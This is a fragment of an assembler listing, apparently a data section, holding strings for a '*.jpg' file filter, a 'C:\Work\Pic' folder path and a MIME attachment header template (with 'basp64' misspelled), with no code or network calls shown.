   603 000006F0 2A2E6A706700            szFilter	db		'*.jpg', 0H
   604 000006F6 433A5C576F726B5C50-     szPath		db		'C:\Work\Pic', 0H
   605 000006FF 696300             
   606 00000702 2A2E2A00                AllFile		db		'*.*', 0H
   607 00000706 0D0A00                  szData3		db		0DH, 0AH, 0H
   608 00000709 25735C257300            szData01	db		'%s\%s', 0H
   609 0000070F 2D2D494E56540D0A43-     szDataFile	db 		'--INVT', 0DH, 0AH,'Content-type: application/octet-stream;', 0DH, 0AH,'Content-Transfer-Encoding: basp64;', 0DH, 0AH,'Content-Disposition: attachment;', 0DH, 0AH,'  filename="%s"', 0DH, 0AH, 0DH, 0A
   610 00000718 6F6E74656E742D7479-
   611 00000721 70653A206170706C69-
   612 0000072A 636174696F6E2F6F63-
   613 00000733 7465742D7374726561-
   614 0000073C 6D3B0D0A436F6E7465-
   615 00000745 6E742D5472616E7366-
   616 0000074E 65722D456E636F6469-
   617 00000757 6E673A206261737036-
   618 00000760 343B0D0A436F6E7465-
   619 00000769 6E742D446973706F73-
   620 00000772 6974696F6E3A206174-
   621 0000077B 746163686D656E743B-
   622 00000784 0D0A202066696C656E-
   623 0000078D 616D653D222573220D-
   624 00000796 0A0D0A00           
